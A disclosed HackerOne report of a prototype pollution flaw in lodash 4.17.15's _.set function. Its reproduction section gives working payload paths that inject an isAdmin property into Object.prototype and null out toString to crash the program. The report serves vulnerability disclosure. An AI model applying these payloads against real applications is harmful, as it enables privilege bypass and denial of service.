# Prototype pollution attack (lodash)

## Report Details
- **Report ID**: 841380
- **URL**: https://hackerone.com/reports/841380
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-04-06T12:25:52.689Z
- **Disclosed**: 2020-08-25T09:26:13.115Z

## Reporter
- **Username**: macasun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a prototype pollution vulnerability in lodash.
It allows an attacker to inject properties on `Object.prototype`.

# Module

module name: lodash
version: 4.17.15
npm page: https://www.npmjs.com/package/lodash

## Module Description

A modern JavaScript utility library delivering modularity, performance, & extras. 

## Module Stats

28M downloads in the last week

# Vulnerability

## Vulnerability Description

`_.set` function can be used to modify `Object.prototype`. If the attacker can control the value of `path`, he can add or modify existing property on all objects.

## Steps To Reproduce:

```js
const _ = require('lodash');

_.set({}, 'constructor.prototype.isAdmin', true);
console.log({}.isAdmin); // true

_.set({}, 'constructor.prototype.toString', null);
console.log({}.toString()); // crash
```

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

Business logic errors, Denial of service.

## Attachments
No attachments
